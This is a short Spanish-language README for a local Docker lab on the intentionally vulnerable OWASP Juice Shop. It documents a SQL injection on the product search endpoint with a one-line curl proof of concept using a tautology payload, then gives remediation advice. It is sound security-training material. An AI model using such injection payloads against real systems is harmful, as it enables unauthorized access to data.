# OWASP Juice Shop - Mini-lab (en local con Docker)

🧃 **OWASP Juice Shop** es una aplicación intencionalmente vulnerable para practicar detección de vulnerabilidades web.

## Contribuciones
Las contribuciones son bienvenidas. Revisa `CONTRIBUTING.md` para instrucciones. Por favor evita enviar artefactos que contengan credenciales; usa versiones sanitizadas.

## Resumen
En este mini-laboratorio confirmé una **inyección SQL (SQLi)** en el endpoint de búsqueda `GET /rest/products/search?q=` y verifiqué No-IDOR en el caso probado.

### PoC (entorno local)

```
curl -s "http://localhost:3000/rest/products/search?q=%27%20OR%20%271%27%3D%271" | jq


```
## Resultado observado

La respuesta del servidor devolvió:

##### {"status":"success","data":[ ... ]}

Múltiples productos fueron devueltos tras la inyección.

## Recomendaciones

##### Usar consultas parametrizadas (prepared statements).

##### Validar/normalizar entradas.

##### No exponer errores SQL a usuarios; registrar internamente.

##### Incluir pruebas automáticas en CI (SAST + DAST + tests de integración no destructivos en entornos de prueba).
